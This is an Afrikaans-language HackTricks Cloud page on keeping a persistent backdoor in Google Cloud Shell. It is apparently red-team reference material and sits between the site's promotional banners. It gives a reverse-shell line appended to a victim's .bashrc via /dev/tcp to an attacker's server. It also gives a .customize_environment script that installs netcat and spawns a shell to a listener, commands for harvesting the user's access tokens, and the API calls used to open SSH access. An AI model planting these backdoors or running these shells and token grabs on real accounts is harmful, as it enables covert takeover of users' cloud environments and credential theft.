# GCP - Wolkmussel Volharding

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
*
* &#x20;github-repos.

</details>

## Wolkmussel

Vir meer inligting, kyk na:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Volgehoue Agterdeur

[**Google Cloud Shell**](https://cloud.google.com/shell/) bied jou bevellyn-toegang tot jou wolkbronne direk vanuit jou webblaaier sonder enige verbandhoudende koste.

Jy kan toegang kry tot Google se Cloud Shell vanuit die **webkonsol** of deur **`gcloud cloud-shell ssh`** uit te voer.

Hierdie konsol het 'n paar interessante vermo√´ns vir aanvallers:

1. **Enige Google-gebruiker met toegang tot Google Cloud** het toegang tot 'n ten volle geoutentiseerde Cloud Shell-instantie (Selfdiensrekeninge kan, selfs as eienaars van die organisasie, toegang h√™).
2. Genoemde instantie sal **sy tuisgids vir ten minste 120 dae handhaaf** as daar geen aktiwiteit plaasvind nie.
3. Daar is **geen vermo√´ vir 'n organisasie om die aktiwiteit** van daardie instantie te monitor nie.

Dit beteken basies dat 'n aanvaller 'n agterdeur in die tuisgids van die gebruiker kan plaas en solank die gebruiker elke 120 dae ten minste met die GC Shell verbind, sal die agterdeur oorleef en die aanvaller sal elke keer as dit uitgevoer word 'n skul kry deur net die volgende te doen:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Daar is nog 'n l√™er in die tuisskerm genaamd **`.customize_environment`** wat, as dit bestaan, elke keer uitgevoer sal word as die gebruiker toegang tot die **wolkskulp** verkry (soos in die vorige tegniek). Voeg net die vorige agterdeur in of een soos die volgende om volharding te handhaaf solank die gebruiker die wolkskulp "gereeld" gebruik:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Dit is belangrik om daarop te let dat die **eerste keer wat 'n aksie wat verifikasie vereis uitgevoer word**, 'n pop-up magtigingsvenster in die gebruiker se webblaaier verskyn. Hierdie venster moet aanvaar word voordat die opdrag kan uitgevoer word. As 'n onverwagte pop-up verskyn, kan dit argwaan wek en potensieel die volhardingsmetode wat gebruik word, in gevaar bring.
{% endhint %}

Hierdie is die pop-up van die uitvoering van `gcloud projects list` vanuit die wolkshell (as aanvaller) wat in die gebruiker se blaaier-sessie vertoon word:


<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Maar as die gebruiker aktief die wolkshell gebruik het, sal die pop-up nie verskyn nie en kan jy **tokens van die gebruiker versamel met**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### Hoe die SSH-verbinding tot stand gebring word

Basies word hierdie 3 API-oproepe gebruik:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (sal jou laat jou openbare sleutel wat jy plaaslik geskep het, byvoeg)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (sal jou laat die instansie begin)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (sal jou die IP van die Google Cloud Shell gee)

Maar jy kan verdere inligting vind by [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Verwysings

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
* &#x20;github-repos.

</details>
